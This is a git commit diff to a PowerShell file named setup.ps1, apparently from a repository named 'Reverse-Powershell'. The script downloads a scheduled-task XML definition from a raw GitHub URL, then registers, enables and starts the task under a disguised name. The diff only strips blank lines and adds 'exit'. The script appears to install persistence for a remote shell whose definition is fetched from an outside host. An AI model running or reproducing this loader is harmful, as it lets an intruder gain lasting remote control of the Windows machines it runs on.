effc48496ee714636618d8830e5d48970501d70d
RacoonK1ng <nevio09.caputo@icloud.com>
2025-01-18 13:49:49 +0100

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -1,6 +1,4 @@
 Register-ScheduledTask -Xml (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/RacoonK1ng/Reverse-Powershell/refs/heads/main/Task.xml").Content -TaskName "SYSTEMexecutionWindowsbullshit" -Force
-
 Enable-ScheduledTask -TaskName "SYSTEMexecutionWindowsbullshit"
-
-
 Start-ScheduledTask -TaskName "SYSTEMexecutionWindowsbullshit"
+exit
